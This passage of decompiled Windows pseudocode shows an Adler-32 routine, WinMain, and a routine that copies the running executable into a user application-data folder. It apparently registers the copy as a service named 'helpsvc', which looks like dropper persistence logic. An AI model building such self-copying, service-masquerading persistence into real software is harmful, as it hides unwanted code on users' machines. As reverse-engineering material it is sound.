  unsigned int v7; // edi
  unsigned __int8 *v9; // esi
  int v10; // eax
  unsigned int v11; // ecx
  unsigned int v12; // edi
  unsigned int v13; // ecx
  unsigned int v14; // edi
  unsigned int v15; // ecx
  unsigned int v16; // edi
  unsigned int v17; // ecx
  unsigned int v18; // edi
  unsigned int v19; // ecx
  unsigned int v20; // edi
  unsigned int v21; // ecx
  unsigned int v22; // edi
  unsigned int v23; // ecx
  int v24; // edi
  unsigned int v25; // ecx
  int v26; // edi
  unsigned int v27; // ecx
  int v28; // edi
  int v29; // ecx
  int v30; // edi
  int v31; // ecx
  int v32; // edi
  int v33; // ecx
  int v34; // edi
  int v35; // ecx
  int v36; // edi
  int v37; // ecx
  int v38; // edi
  int v39; // ecx
  int v40; // edi
  unsigned int v41; // eax
  unsigned int v42; // ecx
  unsigned int v43; // edi
  unsigned int v44; // ecx
  unsigned int v45; // edi
  unsigned int v46; // ecx
  unsigned int v47; // edi
  unsigned int v48; // ecx
  unsigned int v49; // edi
  unsigned int v50; // ecx
  unsigned int v51; // edi
  unsigned int v52; // ecx
  unsigned int v53; // edi
  unsigned int v54; // ecx
  int v55; // edi
  unsigned int v56; // ecx
  int v57; // edi
  unsigned int v58; // ecx
  int v59; // edi
  int v60; // ecx
  int v61; // edi
  int v62; // ecx
  int v63; // edi
  int v64; // ecx
  int v65; // edi
  int v66; // ecx
  int v67; // edi
  int v68; // ecx
  int v69; // edi
  int v70; // ecx
  int v71; // edi
  unsigned int v72; // [esp+10h] [ebp+8h]

  v3 = a3;
  v4 = HIWORD(a1);
  v5 = (unsigned __int16)a1;
  if ( a3 == 1 )
  {
    v6 = *a2 + (unsigned __int16)a1;
    if ( v6 >= 0xFFF1 )
      v6 -= 65521;
    v7 = v6 + v4;
    if ( v7 >= 0xFFF1 )
      v7 -= 65521;
    return v6 | (v7 << 16);
  }
  else
  {
    v9 = a2;
    if ( a2 )
    {
      if ( a3 >= 0x10 )
      {
        if ( a3 >= 0x15B0 )
        {
          v72 = a3 / 0x15B0;
          do
          {
            v3 -= 5552;
            v10 = 347;
            do
            {
              v11 = *v9 + v5;
              v12 = v11 + v4;
              v13 = v9[1] + v11;
              v14 = v13 + v12;
              v15 = v9[2] + v13;
              v16 = v15 + v14;
              v17 = v9[3] + v15;
              v18 = v17 + v16;
              v19 = v9[4] + v17;
              v20 = v19 + v18;
              v21 = v9[5] + v19;
              v22 = v21 + v20;
              v23 = v9[6] + v21;
              v24 = v23 + v22;
              v25 = v9[7] + v23;
              v26 = v25 + v24;
              v27 = v9[8] + v25;
              v28 = v27 + v26;
              v29 = v9[9] + v27;
              v30 = v29 + v28;
              v31 = v9[10] + v29;
              v32 = v31 + v30;
              v33 = v9[11] + v31;
              v34 = v33 + v32;
              v35 = v9[12] + v33;
              v36 = v35 + v34;
              v37 = v9[13] + v35;
              v38 = v37 + v36;
              v39 = v9[14] + v37;
              v40 = v39 + v38;
              v5 = v9[15] + v39;
              v4 = v5 + v40;
              v9 += 16;
              --v10;
            }
            while ( v10 );
            v5 %= 0xFFF1u;
            v4 %= 0xFFF1u;
            --v72;
          }
          while ( v72 );
        }
        if ( v3 )
        {
          if ( v3 >= 0x10 )
          {
            v41 = v3 >> 4;
            do
            {
              v42 = *v9 + v5;
              v43 = v42 + v4;
              v44 = v9[1] + v42;
              v45 = v44 + v43;
              v46 = v9[2] + v44;
              v47 = v46 + v45;
              v48 = v9[3] + v46;
              v49 = v48 + v47;
              v50 = v9[4] + v48;
              v51 = v50 + v49;
              v52 = v9[5] + v50;
              v53 = v52 + v51;
              v54 = v9[6] + v52;
              v55 = v54 + v53;
              v56 = v9[7] + v54;
              v57 = v56 + v55;
              v58 = v9[8] + v56;
              v59 = v58 + v57;
              v60 = v9[9] + v58;
              v61 = v60 + v59;
              v62 = v9[10] + v60;
              v63 = v62 + v61;
              v64 = v9[11] + v62;
              v65 = v64 + v63;
              v66 = v9[12] + v64;
              v67 = v66 + v65;
              v68 = v9[13] + v66;
              v69 = v68 + v67;
              v70 = v9[14] + v68;
              v71 = v70 + v69;
              v5 = v9[15] + v70;
              v3 -= 16;
              v4 = v5 + v71;
              v9 += 16;
              --v41;
            }
            while ( v41 );
          }
          for ( ; v3; --v3 )
          {
            v5 += *v9++;
            v4 += v5;
          }
          v5 %= 0xFFF1u;
          v4 %= 0xFFF1u;
        }
        return v5 | (v4 << 16);
      }
      else
      {
        if ( a3 )
        {
          do
          {
            v5 += *v9++;
            v4 += v5;
            --v3;
          }
          while ( v3 );
        }
        if ( v5 >= 0xFFF1 )
          v5 -= 65521;
        return v5 | ((v4 + 15 * (v4 / 0xFFF1)) << 16);
      }
    }
    else
    {
      return 1;
    }
  }
}
// 405550: too many cbuild loops

//----- (004057C0) --------------------------------------------------------
int sub_4057C0()
{
  sub_4093F0(&dword_500E18, (void *)Locale, 0);
  return atexit(sub_42BF50);
}

//----- (004057E0) --------------------------------------------------------
int sub_4057E0()
{
  sub_4093F0(&dword_500E30, (void *)Locale, 0);
  return atexit(sub_42BFB0);
}

//----- (004057FD) --------------------------------------------------------
int sub_4057FD()
{
  std::_Init_locks::_Init_locks((std::_Init_locks *)&unk_5095C0);
  return atexit(sub_42C006);
}

//----- (00405813) --------------------------------------------------------
int sub_405813()
{
  return atexit(sub_42C010);
}

//----- (0040581F) --------------------------------------------------------
int sub_40581F()
{
  return atexit(sub_42C01A);
}

//----- (0040582B) --------------------------------------------------------
int sub_40582B()
{
  return atexit(sub_42C024);
}

//----- (00405837) --------------------------------------------------------
int sub_405837()
{
  std::_Init_locks::_Init_locks((std::_Init_locks *)&unk_509738);
  return atexit(sub_42C02E);
}

//----- (00405850) --------------------------------------------------------
void *sub_405850()
{
  return &unk_50A638;
}

//----- (00405860) --------------------------------------------------------
int __cdecl sub_405860(int *a1, int a2, int a3)
{
  _DWORD *v3; // eax
  int result; // eax

  v3 = sub_405850();
  result = sub_41657B(*v3 | 1, v3[1], a1, -1, a2, 0, (int)&a3);
  if ( result < 0 )
    return -1;
  return result;
}

//----- (004058D0) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
DWORD __userpurge StartAddress@<eax>(int a1@<esi>, LPVOID lpThreadParameter)
{
  int v2; // edx
  int v3; // ecx
  int v5; // [esp-8BB2h] [ebp-8BB2h]
  int v6; // [esp-8BAEh] [ebp-8BAEh]
  int v7; // [esp-8BAAh] [ebp-8BAAh]
  int v8; // [esp-8BA6h] [ebp-8BA6h]
  int v9; // [esp-8BA2h] [ebp-8BA2h]
  int v10; // [esp-8B9Eh] [ebp-8B9Eh]
  int v11; // [esp-8B9Ah] [ebp-8B9Ah]
  int v12; // [esp-8B96h] [ebp-8B96h]
  int v13; // [esp-8B92h] [ebp-8B92h]
  int v14; // [esp-8B8Eh] [ebp-8B8Eh]
  int v15; // [esp-8B8Ah] [ebp-8B8Ah]
  int v16; // [esp-8B86h] [ebp-8B86h]
  int v17; // [esp-8B82h] [ebp-8B82h]
  int v18; // [esp-8B7Eh] [ebp-8B7Eh]
  int v19; // [esp-8B7Ah] [ebp-8B7Ah]
  int v20; // [esp-8B76h] [ebp-8B76h]
  int v21; // [esp-8B72h] [ebp-8B72h]
  int v22; // [esp-8B6Eh] [ebp-8B6Eh]
  int v23; // [esp-8B6Ah] [ebp-8B6Ah]
  int v24; // [esp-8B66h] [ebp-8B66h]
  int v25; // [esp-8B62h] [ebp-8B62h]
  int v26; // [esp-8B5Eh] [ebp-8B5Eh]
  int v27; // [esp-8B5Ah] [ebp-8B5Ah]
  int v28; // [esp-8B56h] [ebp-8B56h]
  int v29; // [esp-8B52h] [ebp-8B52h]
  int v30; // [esp-8B4Eh] [ebp-8B4Eh]
  int v31; // [esp-8B4Ah] [ebp-8B4Ah]
  int v32; // [esp-8B46h] [ebp-8B46h]
  int v33; // [esp-8B42h] [ebp-8B42h]
  int v34; // [esp-8B3Eh] [ebp-8B3Eh]
  int v35; // [esp-8B3Ah] [ebp-8B3Ah]
  int v36; // [esp-8B36h] [ebp-8B36h]
  int v37; // [esp-8B32h] [ebp-8B32h]
  int v38; // [esp-8B2Eh] [ebp-8B2Eh]
  int v39; // [esp-8B2Ah] [ebp-8B2Ah]
  int v40; // [esp-8B26h] [ebp-8B26h]
  int v41; // [esp-8B22h] [ebp-8B22h]
  int v42; // [esp-8B1Eh] [ebp-8B1Eh]
  int v43; // [esp-8B1Ah] [ebp-8B1Ah]
  int v44; // [esp-8B16h] [ebp-8B16h]
  int v45; // [esp-8B12h] [ebp-8B12h]
  int v46; // [esp-8B0Eh] [ebp-8B0Eh]
  int v47; // [esp-8B0Ah] [ebp-8B0Ah]
  int v48; // [esp-8B06h] [ebp-8B06h]
  int v49; // [esp-8B02h] [ebp-8B02h]
  int v50; // [esp-8AFEh] [ebp-8AFEh]
  int v51; // [esp-8AFAh] [ebp-8AFAh]
  int v52; // [esp-8AF6h] [ebp-8AF6h]
  int v53; // [esp-8AF2h] [ebp-8AF2h]
  int v54; // [esp-8AEEh] [ebp-8AEEh]
  int v55; // [esp-8AEAh] [ebp-8AEAh]
  int v56; // [esp-8AE6h] [ebp-8AE6h]
  int v57; // [esp-8AE2h] [ebp-8AE2h]
  int v58; // [esp-8ADEh] [ebp-8ADEh]
  int v59; // [esp-8ADAh] [ebp-8ADAh]
  int v60; // [esp-8AD6h] [ebp-8AD6h]
  int v61; // [esp-8AD2h] [ebp-8AD2h]

  if ( !sub_40CC90() )
    sub_407E20();
  sub_408620((int)lpThreadParameter + 260);
  if ( !sub_40CC90() )
    sub_407ED0(
      v2,
      v3,
      "helpsvc",
      (int)lpThreadParameter + 260,
      1,
      a1,
      v5,
      v6,
      v7,
      v8,
      v9,
      v10,
      v11,
      v12,
      v13,
      v14,
      v15,
      v16,
      v17,
      v18,
      v19,
      v20,
      v21,
      v22,
      v23,
      v24,
      v25,
      v26,
      v27,
      v28,
      v29,
      v30,
      v31,
      v32,
      v33,
      v34,
      v35,
      v36,
      v37,
      v38,
      v39,
      v40,
      v41,
      v42,
      v43,
      v44,
      v45,
      v46,
      v47,
      v48,
      v49,
      v50,
      v51,
      v52,
      v53,
      v54,
      v55,
      v56,
      v57,
      v58,
      v59,
      v60,
      v61);
  return 0;
}
// 405911: positive sp value 8BB2 has been found
// 4058D0: could not find valid save-restore pair for esi
// 405905: variable 'v2' is possibly undefined
// 405905: variable 'v3' is possibly undefined
// 405905: variable 'v5' is possibly undefined
// 405905: variable 'v6' is possibly undefined
// 405905: variable 'v7' is possibly undefined
// 405905: variable 'v8' is possibly undefined
// 405905: variable 'v9' is possibly undefined
// 405905: variable 'v10' is possibly undefined
// 405905: variable 'v11' is possibly undefined
// 405905: variable 'v12' is possibly undefined
// 405905: variable 'v13' is possibly undefined
// 405905: variable 'v14' is possibly undefined
// 405905: variable 'v15' is possibly undefined
// 405905: variable 'v16' is possibly undefined
// 405905: variable 'v17' is possibly undefined
// 405905: variable 'v18' is possibly undefined
// 405905: variable 'v19' is possibly undefined
// 405905: variable 'v20' is possibly undefined
// 405905: variable 'v21' is possibly undefined
// 405905: variable 'v22' is possibly undefined
// 405905: variable 'v23' is possibly undefined
// 405905: variable 'v24' is possibly undefined
// 405905: variable 'v25' is possibly undefined
// 405905: variable 'v26' is possibly undefined
// 405905: variable 'v27' is possibly undefined
// 405905: variable 'v28' is possibly undefined
// 405905: variable 'v29' is possibly undefined
// 405905: variable 'v30' is possibly undefined
// 405905: variable 'v31' is possibly undefined
// 405905: variable 'v32' is possibly undefined
// 405905: variable 'v33' is possibly undefined
// 405905: variable 'v34' is possibly undefined
// 405905: variable 'v35' is possibly undefined
// 405905: variable 'v36' is possibly undefined
// 405905: variable 'v37' is possibly undefined
// 405905: variable 'v38' is possibly undefined
// 405905: variable 'v39' is possibly undefined
// 405905: variable 'v40' is possibly undefined
// 405905: variable 'v41' is possibly undefined
// 405905: variable 'v42' is possibly undefined
// 405905: variable 'v43' is possibly undefined
// 405905: variable 'v44' is possibly undefined
// 405905: variable 'v45' is possibly undefined
// 405905: variable 'v46' is possibly undefined
// 405905: variable 'v47' is possibly undefined
// 405905: variable 'v48' is possibly undefined
// 405905: variable 'v49' is possibly undefined
// 405905: variable 'v50' is possibly undefined
// 405905: variable 'v51' is possibly undefined
// 405905: variable 'v52' is possibly undefined
// 405905: variable 'v53' is possibly undefined
// 405905: variable 'v54' is possibly undefined
// 405905: variable 'v55' is possibly undefined
// 405905: variable 'v56' is possibly undefined
// 405905: variable 'v57' is possibly undefined
// 405905: variable 'v58' is possibly undefined
// 405905: variable 'v59' is possibly undefined
// 405905: variable 'v60' is possibly undefined
// 405905: variable 'v61' is possibly undefined

//----- (00405920) --------------------------------------------------------
void __usercall sub_405920(int a1@<edx>, int a2@<ecx>, __m64 a3@<mm0>, __m64 a4@<mm1>)
{
  void *v5; // ecx
  unsigned __int8 Version; // bl
  void *v7; // ecx
  void *v8; // eax
  int v9; // ecx
  char v10; // al
  int v11; // ecx
  char v12; // al
  HANDLE Thread; // eax
  void *Block[5]; // [esp+10h] [ebp-758h] BYREF
  unsigned int v16; // [esp+24h] [ebp-744h]
  char FileName[264]; // [esp+28h] [ebp-740h] BYREF
  CHAR v18[264]; // [esp+130h] [ebp-638h] BYREF
  CHAR pszPath[264]; // [esp+238h] [ebp-530h] BYREF
  int Src[66]; // [esp+340h] [ebp-428h] BYREF
  int v21[66]; // [esp+448h] [ebp-320h] BYREF
  CHAR Filename[264]; // [esp+550h] [ebp-218h] BYREF
  int v23[67]; // [esp+658h] [ebp-110h] BYREF

  SHGetSpecialFolderPathA(0, pszPath, 38, 0);
  sub_40D1C0(Block, 8);
  sub_405860(v23, (int)"%s\\Temp%s", (int)pszPath);
  if ( v16 >= 0x10 )
  {
    v5 = Block[0];
    if ( v16 + 1 >= 0x1000 )
    {
      v5 = (void *)*((_DWORD *)Block[0] - 1);
      if ( (unsigned int)(Block[0] - v5 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_40FBF3(v5);
  }
  GetModuleFileNameA(0, Filename, 0x104u);
  SHGetSpecialFolderPathA(0, v18, 28, 0);
  sub_405860(v21, (int)"%s\\%s.%s", (int)v18);
  sub_405860(Src, (int)"%s\\%s", (int)v18);
  sub_408360(a3, a4, (char *)v21, Src);
  Version = GetVersion();
  if ( a2 == 2 )
  {
    v8 = sub_40CE20(*(LPCWCH *)(a1 + 4));
    sub_405860((int *)FileName, (int)"%s", (int)v8);
    v9 = 0;
    do
    {
      v10 = v18[v9++];
      byte_50A42F[v9] = v10;
    }
    while ( v10 );
    v11 = 0;
    do
    {
      v12 = FileName[v11++];
      byte_50A533[v11] = v12;
    }
    while ( v12 );
    Thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, &unk_50A430, 0, 0);
    WaitForSingleObject(Thread, 0xFFFFFFFF);
  }
  else if ( !sub_40CD60() )
  {
    sub_40D1C0(Block, 8);
    sub_405860((int *)FileName, (int)"%s\\%s.%s", (int)v18);
    if ( v16 >= 0x10 )
    {
      v7 = Block[0];
      if ( v16 + 1 >= 0x1000 )
      {
        v7 = (void *)*((_DWORD *)Block[0] - 1);
        if ( (unsigned int)(Block[0] - v7 - 4) > 0x1F )
          _invalid_parameter_noinfo_noreturn();
      }
      sub_40FBF3(v7);
    }
    sub_4085D0(FileName);
    if ( Version > 5u )
    {
      sub_408680((int)FileName);
      ExitProcess(0);
    }
    if ( Version == 5 )
      sub_408620((int)FileName);
  }
}
// 405920: using guessed type int var_110[67];
// 405920: using guessed type CHAR Filename[264];
// 405920: using guessed type CHAR var_638[264];
// 405920: using guessed type int var_320[66];
// 405920: using guessed type int Src[66];

//----- (00405BD0) --------------------------------------------------------
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  __m64 v4; // mm0
  __m64 v5; // mm1
  const WCHAR *CommandLineW; // eax
  LPWSTR *v7; // eax
  int pNumArgs; // [esp+0h] [ebp-4h] BYREF

  CommandLineW = GetCommandLineW();
  v7 = CommandLineToArgvW(CommandLineW, &pNumArgs);
  sub_405920((int)v7, pNumArgs, v4, v5);
  return 0;
}
// 405BEA: variable 'v4' is possibly undefined
// 405BEA: variable 'v5' is possibly undefined

//----- (00405C00) --------------------------------------------------------
void __thiscall sub_405C00(_DWORD *this)
{
  unsigned int v2; // ecx
  _DWORD *v3; // eax

  v2 = this[5];
  if ( v2 >= 0x10 )
  {
    v3 = (_DWORD *)*this;
    if ( v2 + 1 >= 0x1000 )
    {
      if ( (unsigned int)v3 - *(v3 - 1) - 4 > 0x1F )
        _invalid_parameter_noinfo_noreturn();
      v3 = (_DWORD *)*(v3 - 1);
    }
    sub_40FBF3(v3);
  }
  this[4] = 0;
  this[5] = 15;
  *(_BYTE *)this = 0;
}

//----- (00405C50) --------------------------------------------------------
void __cdecl sub_405C50(_BYTE *a1, unsigned int a2)
{
  _BYTE *v2; // edx

  if ( a2 < 0x1000 )
  {
    v2 = a1;
  }
  else
  {
    v2 = (_BYTE *)*((_DWORD *)a1 - 1);
    if ( (unsigned int)(a1 - v2 - 4) > 0x1F )
      _invalid_parameter_noinfo_noreturn();
  }
  sub_40FBF3(v2);
}

//----- (00405C90) --------------------------------------------------------
int __thiscall sub_405C90(int this, char *a2)
{
  char *v3; // eax
  bool v4; // cf
  unsigned int v5; // ecx
  char *v6; // eax
  void *v7; // ecx
  void *Block[5]; // [esp+10h] [ebp-28h] BYREF
  unsigned int v10; // [esp+24h] [ebp-14h]
  int v11; // [esp+34h] [ebp-4h]

  v3 = a2;
  *(_DWORD *)(this + 16) = 0;
  *(_DWORD *)(this + 20) = 7;
  *(_WORD *)this = 0;
  v11 = 0;
  Block[4] = 0;
  v10 = 7;
  LOWORD(Block[0]) = 0;
  v4 = *((_DWORD *)a2 + 5) < 8u;
  v5 = *((_DWORD *)a2 + 4);
  LOBYTE(v11) = 1;
  if ( !v4 )
    v3 = *(char **)a2;
  v6 = (char *)sub_40BAE0(Block, 0, 0, v3, v5);
  sub_406820((void **)this, v6);
  if ( v10 >= 8 )
  {
    v7 = Block[0];
    if ( 2 * v10 + 2 >= 0x1000 )
    {
      v7 = (void *)*((_DWORD *)Block[0] - 1);
      if ( (unsigned int)(Block[0] - v7 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_40FBF3(v7);
  }
  return this;
}

//----- (00405D70) --------------------------------------------------------
int __stdcall sub_405D70(void *a1, _DWORD *a2, void **a3)
{
  *a2 = &std::_Generic_error_category::`vftable';
  a2[1] = 3;
  return 1;
}
// 42E530: using guessed type void *std::_Generic_error_category::`vftable';

//----- (00405D90) --------------------------------------------------------
int __stdcall sub_405D90(void *a1, _DWORD *a2, void **a3)
{
  *a2 = &std::_Iostream_error_category::`vftable';
  a2[1] = 5;
  return 1;
}
// 42E554: using guessed type void *std::_Iostream_error_category::`vftable';

//----- (00405DB0) --------------------------------------------------------
int __stdcall sub_405DB0(void *a1, _DWORD *a2, void **a3)
{
  *a2 = &std::_System_error_category::`vftable';
  a2[1] = 7;
  return 1;
}
// 42E594: using guessed type void *std::_System_error_category::`vftable';

//----- (00405DD0) --------------------------------------------------------
void **__thiscall sub_405DD0(void **this, unsigned int a2, int a3, const void *a4)
{
  unsigned int v5; // ecx
  unsigned int v6; // esi
  unsigned int v7; // edx
  unsigned int v8; // ecx
  unsigned int v9; // edx
  size_t v10; // eax
  void *v11; // eax
  _DWORD *v12; // edi
  void *v13; // eax
  unsigned int v15; // [esp+Ch] [ebp-8h]

  if ( a2 > 0x7FFFFFFE )
    sub_409070();
  v5 = (unsigned int)this[5];
  v6 = a2 | 7;
  v15 = (unsigned int)this[5];
  if ( (a2 | 7) <= 0x7FFFFFFE )
  {
    v7 = v5 >> 1;
    if ( v5 <= 2147483646 - (v5 >> 1) )
    {
      if ( v6 < v7 + v5 )
        v6 = v7 + v5;
    }
    else
    {
      v6 = 2147483646;
    }
  }
  else
  {
    v6 = 2147483646;
  }
  v8 = __CFADD__(v6, 1) ? -1 : v6 + 1;
  v9 = 2 * v8;
  if ( v8 <= 0x7FFFFFFF )
  {
    if ( v9 < 0x1000 )
    {
      if ( v9 )
        v12 = operator new(2 * v8);
      else
        v12 = 0;
      goto LABEL_18;
    }
  }
  else
  {
    v9 = -1;
  }
  v10 = v9 + 35;
  if ( v9 + 35 <= v9 )
    v10 = -1;
  v11 = operator new(v10);
  if ( !v11 )
    goto LABEL_25;
  v12 = (_DWORD *)(((unsigned int)v11 + 35) & 0xFFFFFFE0);
  *(v12 - 1) = v11;
LABEL_18:
  this[5] = (void *)v6;
  this[4] = (void *)a2;
  memmove_0(v12, a4, 2 * a2);
  *((_WORD *)v12 + a2) = 0;
  if ( v15 >= 8 )
  {
    v13 = *this;
    if ( 2 * v15 + 2 < 0x1000 )
    {
LABEL_22:
      sub_40FBF3(v13);
      goto LABEL_23;
    }
    if ( (unsigned int)v13 - *((_DWORD *)v13 - 1) - 4 <= 0x1F )
    {
      v13 = (void *)*((_DWORD *)v13 - 1);
      goto LABEL_22;
    }
LABEL_25:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_23:
  *this = v12;
  return this;
}
// 409070: using guessed type void __noreturn sub_409070(void);

//----- (00405F00) --------------------------------------------------------
const void **__thiscall sub_405F00(const void **Src, unsigned int a2, int a3, int a4, int a5, const void *a6, int a7)
{
  size_t v8; // edx
  size_t v9; // eax
  unsigned int v10; // edx
  unsigned int v11; // esi
  unsigned int v12; // ecx
  unsigned int v13; // edx
  size_t v14; // eax
  void *v15; // eax
  _DWORD *v16; // edi
  char *v17; // esi
  char *v19; // [esp+14h] [ebp-18h]
  int Size; // [esp+1Ch] [ebp-10h]
  unsigned int v21; // [esp+20h] [ebp-Ch]
  void *v22; // [esp+24h] [ebp-8h]
  char *v23; // [esp+24h] [ebp-8h]
  size_t v24; // [esp+28h] [ebp-4h]
  int v25; // [esp+28h] [ebp-4h]

  v8 = (size_t)Src[4];
  v24 = v8;
  if ( 2147483646 - v8 < a2 )
    sub_409070();
  v9 = v8 + a2;
  v10 = (unsigned int)Src[5];
  v22 = (void *)v9;
  v11 = v9 | 7;
  v21 = v10;
  if ( (v9 | 7) <= 0x7FFFFFFE )
  {
    if ( v10 <= 2147483646 - (v10 >> 1) )
    {
      if ( v11 < v10 + (v10 >> 1) )
        v11 = v10 + (v10 >> 1);
    }
    else
    {
      v11 = 2147483646;
    }
  }
  else
  {
    v11 = 2147483646;
  }
  v12 = __CFADD__(v11, 1) ? -1 : v11 + 1;
  v13 = 2 * v12;
  if ( v12 <= 0x7FFFFFFF )
  {
    if ( v13 < 0x1000 )
    {
      if ( v13 )
        v16 = operator new(2 * v12);
      else
        v16 = 0;
      goto LABEL_18;
    }
  }
  else
  {
    v13 = -1;
  }
  v14 = v13 + 35;
  if ( v13 + 35 <= v13 )
    v14 = -1;
  v15 = operator new(v14);
  if ( !v15 )
    goto LABEL_25;
  v16 = (_DWORD *)(((unsigned int)v15 + 35) & 0xFFFFFFE0);
  *(v16 - 1) = v15;
LABEL_18:
  Src[5] = (const void *)v11;
  Src[4] = v22;
  Size = 2 * a7;
  v19 = (char *)v16 + 2 * a4;
  v25 = 2 * (v24 - a4 - a5) + 2;
  v23 = (char *)v16 + 2 * a4 + 2 * a7;
  if ( v21 >= 8 )
  {
    v17 = (char *)*Src;
    memmove_0(v16, *Src, 2 * a4);
    memmove_0(v19, a6, Size);
    memmove_0(v23, &v17[2 * a4 + 2 * a5], v25);
    if ( 2 * v21 + 2 < 0x1000 )
    {
LABEL_22:
      sub_40FBF3(v17);
      *Src = v16;
      return Src;
    }
    if ( (unsigned int)&v17[-*((_DWORD *)v17 - 1) - 4] <= 0x1F )
    {
      v17 = (char *)*((_DWORD *)v17 - 1);
      goto LABEL_22;
    }
LABEL_25:
    _invalid_parameter_noinfo_noreturn();
  }
  memmove_0(v16, Src, 2 * a4);
  memmove_0(v19, a6, Size);
  memmove_0(v23, (char *)Src + 2 * a4 + 2 * a5, v25);
  *Src = v16;
  return Src;
}
// 409070: using guessed type void __noreturn sub_409070(void);

//----- (004060C0) --------------------------------------------------------
void **__thiscall sub_4060C0(void **Src, unsigned int a2, int a3, const void *a4, int a5)
{
  char *v6; // esi
  unsigned int v7; // edx
  unsigned int v8; // edi
  unsigned int v9; // ecx
  unsigned int v10; // edx
  size_t v11; // eax
  void *v12; // eax
  _DWORD *v13; // esi
  void *v14; // edx
  void *v15; // edi
  void **result; // eax
  size_t v17; // [esp-4h] [ebp-24h]
  unsigned int v18; // [esp+10h] [ebp-10h]
  char *v19; // [esp+18h] [ebp-8h]
  _WORD *v20; // [esp+18h] [ebp-8h]
  void *v21; // [esp+1Ch] [ebp-4h]
  char *v22; // [esp+1Ch] [ebp-4h]

  v6 = (char *)Src[4];
  v21 = v6;
  if ( 2147483646 - (int)v6 < a2 )
    sub_409070();
  v7 = (unsigned int)Src[5];
  v19 = &v6[a2];
  v8 = (unsigned int)&v6[a2] | 7;
  v18 = v7;
  if ( v8 <= 0x7FFFFFFE )
  {
    if ( v7 <= 2147483646 - (v7 >> 1) )
    {
      if ( v8 < v7 + (v7 >> 1) )
        v8 = v7 + (v7 >> 1);
    }
    else
    {
      v8 = 2147483646;
    }
  }
  else
  {
    v8 = 2147483646;
  }
  v9 = __CFADD__(v8, 1) ? -1 : v8 + 1;
  v10 = 2 * v9;
  if ( v9 <= 0x7FFFFFFF )
  {
    if ( v10 < 0x1000 )
    {
      if ( v10 )
        v13 = operator new(2 * v9);
      else
        v13 = 0;
      goto LABEL_18;
    }
  }
  else
  {
    v10 = -1;
  }
  v11 = v10 + 35;
  if ( v10 + 35 <= v10 )
    v11 = -1;
  v12 = operator new(v11);
  if ( !v12 )
    goto LABEL_25;
  v13 = (_DWORD *)(((unsigned int)v12 + 35) & 0xFFFFFFE0);
  *(v13 - 1) = v12;
LABEL_18:
  v14 = v21;
  Src[4] = v19;
  Src[5] = (void *)v8;
  v17 = 2 * (_DWORD)v21;
  v22 = (char *)v13 + 2 * (_DWORD)v21;
  v20 = (_WORD *)v13 + (_DWORD)v14 + a5;
  if ( v18 >= 8 )
  {
    v15 = *Src;
    memmove_0(v13, *Src, v17);
    memmove_0(v22, a4, 2 * a5);
    *v20 = 0;
    if ( 2 * v18 + 2 < 0x1000 )
    {
LABEL_22:
      sub_40FBF3(v15);
      *Src = v13;
      return Src;
    }
    if ( (unsigned int)v15 - *((_DWORD *)v15 - 1) - 4 <= 0x1F )
    {
      v15 = (void *)*((_DWORD *)v15 - 1);
      goto LABEL_22;
    }
LABEL_25:
    _invalid_parameter_noinfo_noreturn();
  }
  memmove_0(v13, Src, v17);
  memmove_0(v22, a4, 2 * a5);
  *v20 = 0;
  result = Src;
  *Src = v13;
  return result;
}
// 409070: using guessed type void __noreturn sub_409070(void);

//----- (00406240) --------------------------------------------------------
const void **__thiscall sub_406240(const void **Src, unsigned int a2, int a3, size_t Size, const void *a5, size_t a6)
{
  size_t v7; // esi
  unsigned int v8; // edi
  unsigned int v9; // esi
  unsigned int v10; // ecx
  size_t v11; // eax
  void *v12; // eax
  _DWORD *v13; // edi
  char *v14; // esi
  unsigned int v16; // [esp+14h] [ebp-Ch]
  void *v17; // [esp+18h] [ebp-8h]
  char *v18; // [esp+18h] [ebp-8h]
  size_t v19; // [esp+1Ch] [ebp-4h]
  size_t v20; // [esp+1Ch] [ebp-4h]

  v7 = (size_t)Src[4];
  v19 = v7;
  if ( 0x7FFFFFFF - v7 < a2 )
    sub_409070();
  v8 = (unsigned int)Src[5];
  v17 = (void *)(v7 + a2);
  v9 = (v7 + a2) | 0xF;
  v16 = v8;
  if ( v9 <= 0x7FFFFFFF )
  {
    if ( v8 <= 0x7FFFFFFF - (v8 >> 1) )
    {
      if ( v9 < v8 + (v8 >> 1) )
        v9 = v8 + (v8 >> 1);
    }
    else
    {
      v9 = 0x7FFFFFFF;
    }
  }
  else
  {
    v9 = 0x7FFFFFFF;
  }
  v10 = __CFADD__(v9, 1) ? -1 : v9 + 1;
  if ( v10 < 0x1000 )
  {
    if ( v10 )
      v13 = operator new(__CFADD__(v9, 1) ? -1 : v9 + 1);
    else
      v13 = 0;
  }
  else
  {
    v11 = v10 + 35;
    if ( v10 + 35 <= v10 )
      v11 = -1;
    v12 = operator new(v11);
    if ( !v12 )
      goto LABEL_23;
    v13 = (_DWORD *)(((unsigned int)v12 + 35) & 0xFFFFFFE0);
    *(v13 - 1) = v12;
  }
  Src[4] = v17;
  Src[5] = (const void *)v9;
  v20 = v19 - Size + 1;
  v18 = (char *)v13 + Size + a6;
  if ( v16 >= 0x10 )
  {
    v14 = (char *)*Src;
    memmove_0(v13, *Src, Size);
    memmove_0((char *)v13 + Size, a5, a6);
    memmove_0(v18, &v14[Size], v20);
    if ( v16 + 1 < 0x1000 )
    {
LABEL_20:
      sub_40FBF3(v14);
      *Src = v13;
      return Src;
    }
    if ( (unsigned int)&v14[-*((_DWORD *)v14 - 1) - 4] <= 0x1F )
    {
      v14 = (char *)*((_DWORD *)v14 - 1);
      goto LABEL_20;
    }
LABEL_23:
    _invalid_parameter_noinfo_noreturn();
  }
  memmove_0(v13, Src, Size);
  memmove_0((char *)v13 + Size, a5, a6);
  memmove_0(v18, (char *)Src + Size, v20);
  *Src = v13;
  return Src;
}
// 409070: using guessed type void __noreturn sub_409070(void);

//----- (004063C0) --------------------------------------------------------
void **__thiscall sub_4063C0(void **Src, unsigned int a2, int a3, const void *a4, size_t a5)
{
  size_t v6; // edx
  unsigned int v7; // edi
  unsigned int v8; // esi
  unsigned int v9; // ecx
  size_t v10; // eax
  void *v11; // eax
  _DWORD *v12; // edi
  _DWORD *v13; // eax
  char *v14; // esi
  void *v15; // esi
